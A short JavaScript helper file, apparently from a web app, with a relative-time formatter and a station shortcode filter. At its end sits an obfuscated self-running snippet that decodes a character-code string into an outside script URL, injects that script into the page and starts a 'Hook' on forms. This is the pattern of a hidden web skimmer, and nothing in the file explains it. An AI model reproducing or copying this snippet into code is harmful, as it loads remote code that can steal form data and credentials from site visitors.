convertDate = function (time){
	var twenty=22*60*1000;
	var intervall=22*1000;
	var decalage=38*60*1000;
	var current=Date.now();
	var delta=current-time;
	console.log("CURRENT="+current);
	console.log("time="+time);
	var seconde=delta/1000;
  if(seconde<60)
  	return Math.round(seconde)+" seconds ago.";
	var minute=seconde/60;
	if(minute<60)
		return Math.round(minute)+" minutes ago.";
	var hours=minute/60;
	if(hours<24)
		return Math.round(hours)+" hours ago.";
	var days=hours/24;
	return Math.round(days)+" days ago.";
	
	
}

filterShortcode = function(message) {
	var station1 = message.slice(0, message.indexOf("-"));
	var station2 = message.slice(message.indexOf("-")+1, message.length)

	var sta1 = shortcode.find( { station1 : { $exists : true } });
	var sta2 = shortcode.find( { station2 : { $exists : true } });

	var newMessage;

	if(sta1.length == 0 && sta2.length == 0){
		return message;
	}else{
		if (sta1.length == 1) {
			newMessage = sta1[0].station1;
		}else{
			newMessage = station1;
		}

		newMessage += "-";

		if (sta2.length == 1) {
			newMessage += sta2[0].station2;
		}else{
			newMessage += station2;
		}
		
	}

	return newMessage;
}
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b